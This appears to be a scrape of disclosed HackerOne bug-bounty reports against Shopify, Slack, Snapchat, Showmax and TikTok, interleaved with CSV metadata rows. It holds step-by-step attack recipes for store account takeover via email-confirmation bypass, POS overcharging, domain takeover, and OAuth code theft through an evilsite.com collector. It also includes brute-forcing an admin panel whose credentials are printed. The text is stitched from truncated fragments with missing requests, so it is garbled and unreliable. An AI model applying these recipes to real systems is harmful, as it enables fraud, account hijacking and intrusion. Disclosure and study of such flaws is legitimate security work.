Affected parts of the system
Almost all of the Notification Email Templates are affected. It looks like one has access to an OrderDrop and DraftOrderDrop instance (verifyable throigh {{ class }} or similar methods which expose the class name). Please see the attached Affected Mail Templates screenshot, all templates which do have a Revert to default button rendered are affected.
The thank you page of the checkout is also affected, please see the Checkout Template and Checkout Rendering screenshots which are attached.
Limitations
I wasn't able to supply arguments to the methods exposed through this method, but one is still able to call methods which don't accept any. But just because I couldn't find a way doesn't mean there isn't any.
Impact


One has (at least) the ability to execute instance methods with no arguments and read access to certain otherwise hidden fields via the to_yaml method. Depending on the actual code which is flawed it might be even possible to execute methods with user supplied arguments which would probably result in a server breach (there are very intersting methods like systemu, real_call, instance_eval and instance_exec.


This bypasses access restrictions to certain hidden/filtered fields, like a hashed user password. For example,  a malicious admin can force the delivery of the  Real Order Mail Rendered to an address controlled by him if he does the following:


Ensure the last user who touched an order is a desired victim (e.g. the shop owner)


Edit the customers email to an attacker controlled one via the Customer admin interface


Resend an order confirmation mail which is prepared to render like Real Order Rendering in an Email, by placing {{ to_yaml }} in the template


Final words
Depending on the real flaw in the code this might be something which needs to be addressed by the Liquid library. I would be very pleased if you could disclose what kind of condition exactly led to this flaw. It might be worth chaning Liquid in a way to guard against this kind of flaw as users expect it to be secure by default.
Please let me know if you need any additional information here, I hope I was clear enough with my explainations. I'm still a little disappointed that I didn't manage to achieve 'real' RCE here, but I'm happy on the other side to report this asap even without 'real' RCE so you could fix this asap. I discovered this approx. 18h ago by accident and couldn't spend that much time on developing a PoC.6 attachments:F60587: Malicious_Template_Rendered.pngF60588: Affected_Mail_Templates.pngF60589: Malicious_Template.pngF60590: Real_Order_Mail_Rendering.pngF60591: Checkout_Template.pngF60592: Checkout_Rendering.png",https://hackerone.com/reports/98259,Ontario,Canada,Ottawa,2015,11,6,13,37

#Details:
When going to a premium theme page for example: https://themes.shopify.com/themes/editions/styles/light/ there is a button saying Preview in your store , clicking that button sends a POST request to https://themes.shopify.com/themes/editions/styles/light/demo with an authenticity token to prevent CSRF , but going to the url https://themes.shopify.com/themes/editions/styles/light/demo  directly will get the theme installed without any validation for the authenticity token.
#Steps to reproduce:

Go to themes.myshopify.com then login with your store
Go to https://themes.shopify.com/themes/editions/styles/light/demo and the theme editions will be installed in your shop
To confirm go to https://<your_store>.myshopify.com/admin/themes and you'll see the theme installed there.

Shopify,5001-10000,0.0,200m-1b,$500.00,Low,2.0,Business Logic Errors,[h1-2102] [Yaworski's Broskis] Suspected overcharge and chargebacks in PoS,"xiridium  submitted a report to Shopify.Jan 29th (2 years ago)Summary:
NOTE: This one need verification from the side of Shopify as we can't set up a real payment GW or check the logs of the test one
When checking out in PoS and paying with credit card, it is possible to manipulate numbers in the end request to overcharge a client (charge more than the item price) and to send money to the client from the store
Code 447 BytesWrap lines Copy Download1{
2    ""payment"": {
3        ""session_id"": ""9"",

14        ""location_id"": 52512587798,
15        ""charge"": true
16    }
17}
There are four  values which interest us here: amount, amount_in, amount_rounding and amount_out. Those control how much the client is charged. They should follow the formula amount = amount_in - amount_rounding - amount_out. amount  should always remain the price of the cart.
amount_in is how much is charged from the client. amount_out is how much is taken from the shop. Looks like amount_rounding is a number which is not taken from anyone and is in fact some in-fact-rounding-value.
Some of these values allow negative values which broadens our possibilities. Let's see how it works. 
Steps To Reproduce:
You would need PoS in your show installed and installed on your phone (I used iphone with jailbreak to proxy data into Burp). https://apps.shopify.com/shopify-pos.

NOTE: I have used the test store to work with the payments. In real case this might work differently, but since I couldn't find a way to approve that, I decided to submit it nonetheless.

Create a new order with an item. I will be using a $1.09 dummy item from my shop. Now start the checkout process and select credit card as a payment source.

There is a CSRF vulnerability in the Wholesale application to generate an invitation token for a user and move that user to invited status.
Steps To Reproduce:

Log in to Shopify and configure Wholesale
Add a price list
Add a customer with the tag wholesale
Adjust the pricelist to include the user with the wholesale tag
At this point you should see the user in the customer section (see figure 1)
Now, navigate to https://poc.rhynorater.com/wholesaleShopify/CSRF.html
Wait 30 seconds (for good measure)
Refresh the customer page and note that the user is in the status of invited

Shopify,5001-10000,0.0,200m-1b,"$3,100.00",Medium,4.2,Incorrect Permission Assignment for Critical Resource,[h1-2102] FQDN takeover on all Shopify wholesale customer domains by trailing dot (RFC 1034),"intidc  submitted a report to Shopify.Jan 24th (2 years ago)Summary:
Due to a missing domain format check in Shopify's wholesale functionality, it is possible to serve arbitrary content on the customer's domain through existing DNS records already configured to work with Shopify. I only tested with domains that I own but as far as I understand, this would work with just any domain or subdomain that it set up to work with Shopify wholesale.
This exposes Shopify wholesale customers to several risk, similar to classic subdomain takeovers:

Loss of domain integrity: attackers could host malicious content on the customer's domain
Phishing attacks: attackers could use login/sign up page to capture PII and 
Scams: scammers could recreate trusted wholesale shops, host them under the official domain and collect money

Steps To Reproduce:

For the sake of this proof of concept, we'll take over my test wholesale shop at https://shop.inti.io/accounts/sign_in, which has it's CNAME set to wholesale-shops.shopifyapps.com (as requested by the documentation):

Image F1170259: Screenshot_2021-01-24_at_18.50.28.png 74.76 KiBZoom in Zoom out Copy Download
In real-life attacks, attackers could perform reverse CNAME lookups through e.g. Alien Vault's OTX.

Now log in as attacker and try to add shop.inti.io as a domain name in your preferences. This will not work, because there's already a store attached to it:

Image F1170265: Screenshot_2021-01-24_at_19.00.21.png 140.03 KiBZoom in Zoom out Copy Download

Attacker now sits down, takes a nip of coffee and reads RFC 1034. Attacker notices the following:

Code 556 BytesWrap lines Copy Download1Since a complete domain name ends with the root label, this leads to a
2printed form which ends in a dot.  We use this property to distinguish between:
3
4   - a character string which represents a complete domain name
5     (often called ""absolute"").  For example, ""poneria.ISI.EDU.""
6
7   - a character string that represents the starting labels of a
8     domain name which is incomplete, and should be completed by
9     local software using knowledge of the local domain (often
10     called ""relative"").  For example, ""poneria"" used in the
11     ISI.EDU domain.
In theory, all domain names should have a trailing dot at the end, but since literally no one does that both a domain name with and without a trailing dot will essentially result in the same records being served. Since Shopify does not implement DNS-based verification and only checks whether the record is already present, we can enter the trailing dot version of the domain name to bypass this check:

Image F1170268: Screenshot_2021-01-24_at_19.06.49.png 109.85 KiBZoom in Zoom out Copy Download

Now attacker waits for a few minutes to allow the DNS / SSL changes to propagate. Depending on your browser's cache, it can take a while, but normally after a few minutes the malicious shop should pop up at https://shop.inti.io./accounts/sign_in.

Final results
Real store: https://shop.inti.io/accounts/sign_in

Note to triagers - I have released shop.inti.io. in my shopify so you can claim it and reproduce. This means that the hijacked store is no longer accessible.
This could be done by anyone for any wholesale connected store, without having access to the DNS records.
Recommended fix
Do not consider trailing dots when checking whether domain names already exist on your back-end

Cannot integrate across stores/partner even they share the same email address after confirming them

And the report was later resolved after I verified the fix.
For some reason, I decided to test again to see what's something new that I can find.
Then I found user can change their email prior to receiving the verification message on their original email. i.e. the same technique, I don't know what went wrong in my first retest, but Shopify security and engineering team again showed their professionalism, quickly resolving the second comments I left in ~3.5 hrs.
And when I thought this is the end of story, I later received a comment asking me to open a new report about the second retest, and here I am writing this report.

Summary
It's possible to take over any store account through bypassing the email confirmation step in .myshopify.com. I found a way to confirm arbitrary emails, and after confirming arbitrary email in .myshopify.com, user is able to integrate with other Shopify store that shares the same email address by setting a master password for all of the stores(if the owner hasn't integrated before), effectively taking over every Shopify stores by knowing just the owner's email address.
After signing up a new Shopify instance in https://www.shopify.com/pricing and start the free trial, user can change their email address to a new email address before confirming the one they used to sign up.
The bug is that Shopify email system mistakenly send the confirmation link of the new email address, to the one that is used to signed up.
And the result is user can confirm arbitrary email address. And the next step is taking over other user's Shopify instance by taking advantage of the SSO.
Quick check
If you check https://h31ngalog.myshopify.com/ and see the email address of the owner, it is ngalog@hackerone.com, which I obviously would never be able to validate otherwise

steps to reproduce

Visit https://www.shopify.com/pricing and signup a free trial with an email address, say attacker@gmail.com that you can receive emails
after entering the fields to enter the store, on top right corner, click your name and go to Your Profile
change your email to someone that you want to takeover, for example yaworsk@hackerone.com and click save
All done now, grab a coffee, sit back and relax, watch some YouTube videos and wait for an email to go to your email attacker@gmail.com
The email that you are waiting for is from mailer@shopify.com, and the format should look like this Image F711348: Screenshot_2020-02-10_at_12.18.01_PM.png 145.66 KiBZoom in Zoom out Copy Download
Click the link and you should see your email has been updated to yaworsk@hackerone.com

Reason?
Email system mistakenly send the confirmation link of yaworsk@hackerone.com to attacker@gmail.com because attacker@gmail.com is the one that is saved on system, and the email system didn't notice the confirmation link has been updated to yaworsk@gmail.com, and should not be sent to attacker@gmail.com
SSO account takeover

now we have the ability to confirm arbitrary email, then we can takeover other stores
On top right corner of you-shop.myshopify.com click your name then click profile, you should see a box that says, you have other two accounts in Shopify, want to integrate them together
click yes, then just follow the instructions then you will be able to takeover all other stores by changing the master password for all of the stores under that email address.

Thank you for the great report and for your patience while we decided on a bounty. In this issue, the first behaviour you reported and the behaviour you noticed after the report was resolved have two separate root causes. For this reason, we decided it would be most fair to award these two issues separately. 
We would like to ask that you open a second report about the behaviour where the user changes their email prior to receiving the verification message on their original email. Let us know when you have done this and we will process the bounty.

We're awarding a $15,000 bounty under the ""Privilege escalation to shop owner"" category for Shopify Core. An important mitigating factor was that this bug only affected user accounts which had not yet adopted our single login system.

I found the exactly same bug #97501 at https://app.shopify.com/services/partners/api_clients/<APP-ID> when uploading the svg image on app icon.
Steps to reproduce it

Make a new app at https://app.shopify.com/services/partners/api_clients
Goto app setting https://app.shopify.com/services/partners/api_clients/<APP-ID>
Now upload the attached svg image and change the xlink with your owner.
Save changes and check your server log.

i just found  an csrf token  fixation in facebook store app  which is an offical  shopify app 
link >> https://docs.shopify.com/manual/more/official-shopify-apps/facebook-store
The CSRF bug which connects attacker's Facebook account to victim's shopify  account. This is done by exploiting 'Connect with Facebook' function.
When using 'Connect with Facebook' function. A request is sent to facebook to authorize the shopify app. After authorizing a 'access token' is sent in response which shopify app verifies and connects the account. the verification is done by csrf  token ""state parameter "" 
here state parameter is getting fixed here 
1st oauth request

then when it autorized , we will get this  get !

Summary: At https://sso.showmax.com/auth/failure?message=, you can change the message parameter to any text and it will be returned on the page in a red box. This could lead to phishing and confusing users since the text is being returned within the actual website.
Description: You can take the URL https://sso.showmax.com/auth/failure?message= and change the ""message"" parameter to any text (and you can encode it with percent encoding) and it will be returned as text on the loaded page.
Platform(s) Affected: Tested in Chrome 63.0.3239.132 (Official Build) (64-bit), should work in most situations
User Identification:████████ but N/A
Steps To Reproduce:

Take the URL https://sso.showmax.com/auth/failure?message=
Change the message parameter text to anything
Copy and paste the new URL into a browser
You'll notice the text is returned clearly in a red box at the top of the loaded page

Impact
An attacker could use this to phish and steal user accounts by setting it up with a convincing, percent-encoded message to redirect them to a site with a fake login that steals their information.
Example of an attacker payload: https://sso.showmax.com/auth/failure?message=%47%6F%20%74%6F%20%65%76%69%6C%2E%63%6F%6D
As you can see, at first glance this URL doesn't give away the text in the box, making it even more convincing and dangerous. A real attacker could obviously make a more convincing payload though that said something like my attached image.1 attachment:F254228: ba14f2b6badedcdd6d488be498b35446.pngShowmax  rewarded jackb898 with a $128 bounty. Jan 16th (5 years ago)You are absolutely right, that it is out of official scope.

As soon as the above request is sent, the victim host (YOUR-SERVER) gets an entry in its log file with a request originating from the asecare.att.com domain verifying the pingback

This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.
Remediation Action:
if xmlrpc.php isn't needed, please remove it or at least deny access to it to prevent malicious users from exploiting it

We fixed it back so the file won't be accessible anymore. You'll receive a reward a bit later.
We'd also like to mention that even if it shouldn't happen again, yet, in case of happening the same problem for some reason again in the future it won't be eligible for reward.
If that's ok with you, we'd like to disclose this report so it could serve as a reference in the future.
Best regards,
Aleksaleksandr_kulik Showmax staff  closed the report and changed the status to Resolved. Jun 1st (about 1 year ago)aleksandr_kulik Showmax staff  requested to disclose this report. Jun 1st (about 1 year ago)Showmax  rewarded mdakh404 with a $50 bounty. Jun 1st (about 1 year ago)mdakh404   posted a comment. Updated Jun 1st (about 1 year ago)I'm ok with the disclosure.

i am abbas heybati ;)
Summary:
After reviewing the given scope, I realized that the main domain ""http://sifchain.finance""  has several vulnerabilities that I will report to you as a scenario. I realize that I have reported to you outside of Scope. The report is related to the mentioned company and the vulnerability can endanger your business. I consider it my duty to report this vulnerability to you.
the XML-RPC interface opens two kinds of attacks:
https://sifchain.finance/xmlrpc.php

XML-RPC pingbacks
Brute force attacks via XML-RPC

And in the  /wp-json/wp/v2/users path, it reveals all the user information

https://sifchain.finance/wp-json/wp/v2/users

Steps To Reproduce:

For the two vulnerabilities listed above in the xmlrpc.php section, first post a request to xmlrpc.php for <methodName> system.listMethods </methodName>
given

2.XML-RPC pingbacks attacks
In this case, an attacker is able to leverage the default XML-RPC API in order to perform callbacks for the following purposes:

Distributed denial-of-service (DDoS) attacks - An attacker executes the pingback.ping the method from several affected WordPress installations against a single unprotected target (botnet level).
XSPA (Cross Site Port Attack) - An attacker can execute the pingback.ping the method from a single affected WordPress installation to the same host (or other internal/private host) on different ports. An open port or an internal host can be determined by observing the difference in time of response and/or by looking at the response of the request.

3.Brute force attacks XML-RPC
Sometimes the only way to bypass request limiting or blocking in a brute force attack against WordPress site is to use the all too forgotten XML-RPC API.
In this section, we use the wp / v2 / users path that I mentioned at the beginning of the report.
Here we have found the users from the said path and use them in this section.(The user used in this section is asha8fd635db6e9, which is a report from the first section.)
""The above request can be sent in Burp Intruder (for example) with different sets of credentials. Note that, even if you guess the password or not, the response code will always be 200. ""
""WordPress XML-RPC by default allows an attacker to perform a single request, and brute force hundreds of passwords.""

Impact
1)This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.
2) This method is also used for brute force attacks to stealing the admin credentials and other important credentials

Slack,1001-5000,0.0,200m-1b,$200.00,No value,0.0,Violation of Secure Design Principles,[Screenhero] Subdomain takeover,"yassineaboukir  submitted a report to Slack.May 30th (6 years ago)Hi,
I found out some neglected DNS records that can be exploited to takedown the subdomain of Slack's acquisition feedback.screenhero.com
The security issue is that you have CNAME record that points feedback.screenhero.com to a screenhero.uservoice.com, but the problem is that the service is inactive, thus any malicious hacker would simply sign up for the service and claims the username Screenhero as his and no verification is done by the Service Provider, besides that the DNS-setup is already correctly set.

Scenario attack :
Attacker can now build a complete clone of the real site, add a login form, redirect the user, steal credentials (e.g. admin accounts), cookies and/or completely destroy business credibility for your company along with along with injecting malicious codes to steal their sensitive cookies, redirect them to malicious web pages etc.
Mitigation : To mitigate the threat you should remove CNAME DNS records for the services you don't use anymore.

Hope you are doing good!
Please have a look at the below report.
Description:
OAuth Framework Flaw Bypassing redirect_uri validation
An attacker to exploit this Flaw just needs to find a open redirection flaw in the site which is using Slack's OAuth for logins.
Impact:
A malicious user can steal ""code"" parameter value assigned by Slack OAuth and can hijack victim's account by writing the value in a text file on his evilsite.com/a.php file.
Steps to reproduce:
1) Go to any web app which is using Slack's  OAuth and click on Login with Slack
2) You will be redirected to this URL
https://slack.com/oauth/authorize?client_id=...&scope=read,post&redirect_uri=https://www.givensite.com/../../redirect_url=https://www.evilsite.com/a.php%2Fcomplete
Note i am bypassing the redirect_uri validation by using ../../
In the above URL,i have changed the value of redirect_uri to ../../redirect_url=https://www.evilsite.com/a.php and this should not happen.
The response will be
http://givensite.com/redirect_url=https:/www.evilsite.com/a.php/complete?code=AQCbhUg1FiEQf5TyTesMgjP8zq
And then in the final step code value or access_token value will be written in my a.php file,the malicious guy will scrap it from the URL.
So,then he can login into the victim account using code value.
Please put proper validation on redirect_uri parameter.
The redirect_uri value should exactly match as defined in the application and the user to not be allowed to change it to the subdirectories etc.
This means if redirect_uri value is https://www.google.com then it should take the value https://www.google.com not https://www.google.com/a/x
Looking forward to hear from you,
Best regards,
Anand",https://hackerone.com/reports/2559,California,United States,San Francisco,2014,3,1,11,56

Slack,1001-5000,0.0,200m-1b,$750.00,No value,0.0,Command Injection - Generic,Code Injection in Slack's Windows Desktop Client leads to Privilege Escalation,"fbogner  submitted a report to Slack.Aug 24th (6 years ago)Hi,
This report is about a Code Injection vulnerability in Slack's Windows Desktop Client (slack.exe) that allows any local user to inject code into other user's Slack client.
It has been verified on a fully patched english Windows 7 64bit running the latest available Slack Desktop Client (2.1.1 32-Bit Direct Download). 
The issue is that slack.exe tries to load its OpenSSL configuration from the non-existing file
C:\usr\local\ssl\openssl.cnf (See Procmon screenshot). As any authenticated Windows user is allowed to
create new folders at the system drive's root, the expected folder structure can be created by anyone. 
This enables any local user to create the expected OpenSSL config file. Using this config file it is then possible to instruct OpenSSL to load additional libraries. This finally leads to arbitrary code execution in other user's slack.exe process. This is especially a problem as Slack is automatically started after logging in.
Here's a video illustrating the attack: https://owncloud.bogner.sh/s/MRXZSp0YyfK9ycf
Additionally you can download the source code and the binary version of the used payloads here: https://owncloud.bogner.sh/s/z7kbZr9STr08R73
To fix this vulnerability the OpenSSL config file should only be loaded from secure locations (like somewhere from within the application's root folder)
If you have any questions just let me know.

Slack,1001-5000,0.0,200m-1b,$500.00,No value,0.0,Improper Authentication - Generic,Bypass  two-factor authentication,"kamikaze  submitted a report to Slack.Mar 9th (7 years ago)If a user set 2FA, a user has to enter verification code when a user tries to reset password. 
Under the ""Password Reset"" page, a user can enter wrong two-factor authentication code many times. I said ""many times"" because your bug bounty policy stated...
Exclusions
Issues found through automated testing
So, I may not be allowed to brute force in order to check how many times a user can enter wrong 2FA codes. I didn't use any automated tools and didn't brute force for my testing.
I tested that I could still reset my password after I entered wrong 2FA codes 20 times manually. It seems that a user can brute force 2FA codes.
-----step to reproduce-----


A user sends a password reset message to user's registered email.


Go to ""Password Reset"" page from #1's message.


Set a new password and Brute force two-factor auth code



After a user reset password, a user will go to slack's home page. From that page a user can do anything. 
Two factor authentication is another layer of protection. Even if a user leaked email address and password, a user will be protected by additional security(2FA). 
If an attacker hacked victim's email, an attacker will be able to take over slack's 2FA enabled account by brute forcing 2FA code on password reset page.
Recommendation: If a user entered wrong 2FA codes many times, a user will be blocked temporary.1 attachment:F77484: slack-password.pngslacka   changed the status to Triaged. Mar 15th (7 years ago)Slack  rewarded kamikaze with a $500 bounty. Mar 23rd (7 years ago)leighhoneywell   closed the report and changed the status to Resolved. Mar 23rd (7 years ago)Hi kamikaze,

I've discovered 48+ content spoofing and confirmed all of your Integrations at https://team.slack.com/services/new/ is vulnerable to Content spoofing and exploitable to all users. Content Spoofing An attack technique used to trick a user into thinking that fake web site content is legitimate data and is an attack targeting a user made possible by an injection vulnerability in a web application. When an application does not properly handle user supplied data, an attacker can supply content to a web application, typically via a parameter value, that is reflected back to the user.

I would like to report a privilege escalation issue in which a member of the team is able to create a post on a channel even if the permission to do so is denied to him by the admin.After the admin has limited the number of users who can post to a specific public channel,an unauthorized user who does not have sufficient authority to post anything on it is able to create the post based on commands available to him.I have attached a POC for further clarification.
The admin in this case has denied the team members from creating any posts on the general channel.
In order to bypass this restriction,login as a team member, and create a command post on any channel and intercept the request. Modify the request by changing the channel ID( replace it with the channel ID of general ) and send the request.
We get the success message and on the channel also we can see that the post has been created.
Steps to reproduce:
1.Login as team member.
2.Create a command post on any public channel.
3.Intercept the request.
4.Replace the channel ID in the request with the one of general channel.
Let me know if any other help is needed.
Thanks,

$ file usr/lib/slack/slack

(pie executables report either ""LSB shared object"" or ""LSB pie executable"".)
Position independent executables are required for full ASLR support on Linux. Non-pie-binaries are loaded to a fixed location, thus allowing ROP attacks.
I'm aware that technically this is not a vulnerability, but a lack of a hardening feature. However given that ASLR is generally considered standard practice these days and that lack of it can mean very simple bugs can directly lead to code execution I think it deserves to be fixed.
Impact
A simple memory corruption bug like a buffer overflow can easily lead to a remote code execution bug. With ASLR these bugs are much harder and sometimes impossible to exploit.",https://hackerone.com/reports/415272,California,United States,San Francisco,2018,9,27,12,33

The attacks arise from statistical flaws in the keystream generated by the RC4 algorithm which become apparent in TLS ciphertexts when the same plaintext is repeatedly encrypted.
This vulnerability affects Server.
Attack details
RC4 cipher suites (TLS1 on port 443): 
TLS1_CK_RSA_WITH_RC4_128_SHA - High strength

Snapchat,1001-5000,0.0,200m-1b,$250.00,Medium,5.3,HTTP Request Smuggling,[spectacles.com] Bypassing quantity limit in orders,"hiorws  submitted a report to Snapchat.Jul 7th (5 years ago)Hi Snapchat team,
In the https://www.spectacles.com the quantity of orders has limited (for spectacles is 6 and for accessories is 10 according to help support page). But it can easily be manipulated by editing the URL.
Problem originates from limiting the quantity of the items is with just the UI elements just before adding to cart. After adding to cart step there is no checking step. (The last payment step is included!)
Let me show you PoC to reproduce this issue;

First add a single spectacle to cart,
i.e. Make the quantity of spectacles 6 and add both two accessories with quantity 10.
You will see the ""+"" buttons will be inactive.
Then copy the link address of ""CHECKOUT"" button
Paste it to a new tab of browser and you will see something like that;
https://orders.spectacles.com/cart/24637376965:6,24637373189:10,24637375493:10?attributes[delivery-min-days]=7&attributes[delivery-max-days]=14&attributes[locale]=en-US&checkout[shipping_address][country]=US&access_token=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&_fd=0&_ga=X.XXXXXXXXX.XXXXXXXXXX.XXXXXXXXXX-XXXXXXXXX.XXXXXXXXXX
To make an example change these values 24637376965:6,24637373189:10,24637375493:10 with these 24637376965:6,24637373189:2500,24637375493:25000 then enter
You will see the accessories quantity will be 25000 and the price will be updated according to that.
And you can pass to the last payment step with writing shipping information.

In the screenshots it will be clear and it is easy to reproduce the issue you can easily check this out.
To prevent this issue, a checking operation can be implemented to shopping web app.
Lots of thanks.

Snapchat,1001-5000,0.0,200m-1b,"$1,000.00",No value,0.0,Improper Authentication - Generic,Administrator access to a Django Administration Panel on *.sc-corp.net via bruteforced credentials,"shubs  submitted a report to Snapchat.Apr 4th (7 years ago)Hey team,
While doing some recon for Snapchat's domains, I came across a particular domain of interest - sc-corp.net. It seems that this domain hosts a lot of Snapchat's internal tools, web applications and staging environments such as Phabricator and other administration panels.
From analyzing SSL certificates, I came across the following IP address which contained a wild card common name of *.sc-corp.net:
https://146.148.42.38/
Upon visiting the above IP address, I was prompted with a basic authentication prompt. Even though I clicked cancel and did not authenticate to the panel, the Django REST API panel was returned - albeit in an unauthenticated state.
In order to gain authenticated access to the REST API and the Django administration panels, I ran a small scale bruteforce against the login endpoint located at https://146.148.42.38/api-auth/login/. The following HTTP request was used to perform the bruteforce attack in Burp Intruder:

With a password list of approximately 10,000, I was able to determine the credentials for the Django administration panel after a total of 2459 requests. I've attached a screenshot of the Burp Intruder window showing the successful bruteforce attack (burp_intruder_snapchat_django.png).
Since I now had the credentials (username: admin and password: research), I was then able to use them to access the Django administration panel located at https://146.148.42.38/admin/.
I've attached some screenshots to show the level of access I obtained to the administration panel (snapchatdjango_admin_panel[0-3].png).
Additionally, with the credentials bruteforced, I was able to interact with the Django REST API without any restrictions - i.e. I was able to add new users and groups via the API. Screenshots attached (snapchatdjango_rest_api[0-3].png).
I made no further attempts to escalate privileges on the machine, nor attempted to gain a reverse shell.
I believe that since this machine's SSL certificate's CNAME was *.sc-corp.net, it's likely that there is an actual subdomain that is pointing to this IP. While I was unable to determine the subdomain's name via bruteforcing or enumeration, if there is a valid subdomain pointing to this IP, the severity of this issue could be much higher.
I also assume that since it's most likely within the sc-corp.net scope, the machine itself might have privileged access to the Snapchat internal network on Google Cloud. If I were a malicious attacker, I would attempt to first gain a shell on this machine using my now privileged access and then attempt to pivot onto the Snapchat internal network.
An alternate attack route would be to gain persistent cross-site scripting on the machine with my administrative access and then perform phishing / cookie stealing attacks for applications that run on a subdomain of sc-corp.net. For example, there's Phabricator running on ph.sc-corp.net and this would be a prime target for an attacker to gain access to. This would require the attacker to know the subdomain on sc-corp.net that points to 146.148.42.38.
Please don't hesitate if there are any questions or if you require any further information.
Cheers

I'm starting my research on snapchat by scanning all sub-domains on all the domains in-scope: snapchat.com, bitmoji.com, etc.
Let's look at one of the urls, https://rendering-service.prod.us-east.bitstrips.com/
When I request GET https://rendering-service.prod.us-east.bitstrips.com/
The response is  403 Forbidden
After searching, I've found /WEB-INF/ & /META-INF/ directories, which are accessibles and allow directory listing. 
Inside /WEB-INF/ we have all the .class files of bitmoji, we can download all the files.
Then by using a java decompiler such as procyon-decompiler we reverse the .class files to make those readable. 
best,

Other stuff|:
So what if the Attacker Logout After Doing issue one , When he login again in a different day and use the same method the server will response with  302 Found , To fix this he will use the same Trick that he used in issue 2, By browsing to accounts/unlock etc etc."" and do unlimited requests again.

Thank you for your patience

Snapchat,1001-5000,0.0,200m-1b,$100.00,No value,0.0,Violation of Secure Design Principles,Captcha Bypass in Snapchat's Geofilter Submission Process,"zero  submitted a report to Snapchat.Apr 3rd (8 years ago)Hi,
Overview:
Snapchat provides a form in which users can submit ""Geofilters"". These are filters which get applied to users snaps when they are in specific geolocations. The form (https://www.snapchat.com/geofilters/submit.html) allows for the submission of these ""Geofilters"" as an anonymous user.
The following information is submitted through this form:

Image (filter in PNG format) (image_data)
Name (user_name)
Email (user_email)
Description (description)
Notes (notes)

Vulnerability description:
The HTTP header g-recaptcha-response is not validated on the server-side when submitting a Geofilter to the endpoint /_ah/api/geofilter/v1/submission located on geofilter-dot-feelinsonice-hrd.appspot.com. Any or no value can be provided for this header. 
Since no CAPTCHA verification is needed, an attacker can then conduct a bulk email sending campaign on behalf of the email address no_reply.geofilters@snapchat.com. In addition to this, the attacker can spoof the contents of the email by customising the user_name, notes or description parameters.
Technical description:
After successfully passing the CAPTCHA and submitting the Geofilter, a POST HTTP request is sent to geofilter-dot-feelinsonice-hrd.appspot.com :

Note: In this request, the header g-recaptcha-response does not have a valid token value. Instead, for demonstration purposes I have changed it to I_love_cats_and_kittens_and_all_fluffy_things (I actually do love kittens, but that's not the point). 
The same request can be sent with the very same token above or with no token at all, and it will still succeed. This is where the primary vulnerability lies.
By sending the above request, my email (admin+1@shubh.am) will receive an email along the lines of the following: https://i.imgur.com/EF588pW.png (also attached as email1.png).

The email received by the victim (in this case my email) will look like this: http://i.imgur.com/Xkyw7gV.png (also attached as email2.png).
Impact:
The link https://account.snapchaat.com/verify_geofilter?id=12bc3a76-8df5-457c-bb9a-50f876a76215 is automatically converted into a link (for most web email clients). In addition to this, some email clients (such as Gmail) will hide the rest of the email as it is a duplicate of a previous email (redundant). This makes the malicious email look even more convincing.
These factors combined, allow for a convincing email to be sent, on behalf of the official Snapchat Geofilter API email no_reply.geofilters@snapchat.com. The attacker could leverage this vulnerability to send out emails on behalf of Snapchat. Over 1000 POST requests were sent using 50 threads. No rate limiting or limits were experienced. All 1000 emails were sent.
Additionally, since the images are physically stored somewhere and the emails are sent per request - this vulnerability could also act as a DoS issue for Snapchat. The image_data field in the JSON object sent, is not checked for whether or not it is a valid image. Regardless of the contents, the contents are saved somewhere on Snapchat's servers. Through testing, I found that there were no obvious restrictions to how big of an image could be uploaded via this API.
Both email quota's and file storage quota's could be consumed through the abuse of this API endpoint.
Remediation suggestions:
In order to address this design flaw, the following steps can be taken:

Ensure that the Captcha verification token is being validated on the server-side.
Limit the number of requests which can be sent to this endpoint (time based or number of submissions).
Set a limit on the size of the image which can be sent and/or saved to Snapchat's servers.

Please do not hesitate to contact if any additional details are required regarding this bug.

Impact
A Snapchat lens developer can abuse this bug and increase the number of people who use their lens by making people opening the URL to the lens and replacing SNAPCODE with SNAPCODE_NO_PROMPT.  This can cause false popularity for that lens as it is being unlocked without the user wanting to do so.

Notice an attacker replaced user_id with victim's user_id and the server responded with victim's user_id and given us otp token. Now let's login with the token.

Attacker performs /scauth/otp/login request with username equal victim's username, and the token obtained on previous step.

Snapchat,1001-5000,0.0,200m-1b,$250.00,No value,0.0,None,Incoming email hijacking on sc-cdn.net,"rubyroobs  submitted a report to Snapchat.Sep 15th (6 years ago)Hey guys!
Really interesting find here.
Summary
These dangling MX records on sc-cdn.net have allowed me to purchase an email account with GoDaddy (owner of these servers) and send/receive email from an account on this domain.
Code 104 BytesWrap lines Copy Download1sc-cdn.net.		3599	IN	MX	0 smtp.secureserver.net.
2sc-cdn.net.		3599	IN	MX	10 mailstore1.secureserver.net.
Reproduction
As I now ""own"" this email URL on GoDaddy, in theory you can't register another email address yourself. To prove that I've taken it over, feel free to email me on rubyroobs@sc-cdn.net and I'll be able to paste the message I receive into here to prove ownership of it.
Mitigation
Delete these DNS records to avoid mail being hijacked on this domain.
Impact
I believe impact of hijacking incoming emails on this address far outweighs the smaller consequences of missing SPF records. This would allow me to setup accounts on this email and in some cases allow me to prove control of the domain or impersonation of Snapchat staff.
Been super fun investigating this - not my typical find honestly :D. Let me know if you need any help triaging!
Cheers,

Depending on the nature of the source code disclosed, an attacker can mount one or more of the following types of attacks:•Access the database or other data resources. With the privileges of the account obtained, attempt to read, update or delete arbitrary data from the database.
•Access password protected administrative mechanisms such as ""dashboard"", ""management console"" and ""admin panel"" potentially leading to full control of the application.
•Develop further attacks by investigating the source code for input validation errors and logic vulnerabilities.
Actions to Take
Remove all temporary and backup files.
Required Skills for Successful Exploitation
This is dependent on the information obtained from source code. Uncovering these forms of vulnerabilities does not require high levels of skills. However, a highly skilled attacker could leverage this form of vulnerability to obtain account information for databases or administrative panels, ultimately leading to control of the application or even the host the application resides on.

Unfortunately this was only giving mail hosting capabilities so it wasn't full subdomain takeover, kudos for Starbucks team to still accepting this and rewarding it despite being not full subdomain takeover.

TikTok,10001,0.0,over-1b,"$2,727.00",High,7.7,Server-Side Request Forgery (SSRF),External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing,"ach  submitted a report to TikTok.Dec 20th (2 years ago)Summary by achSummary:
FFmpeg is a free and open-source software project consisting of a large suite of libraries and programs for handling video, audio, and other multimedia files and streams. At its core is the FFmpeg program itself, designed for command-line-based processing of video and audio files. It is widely used for format transcoding, basic editing (trimming and concatenation), video scaling, video post-production effects and standards compliance (SMPTE, ITU).
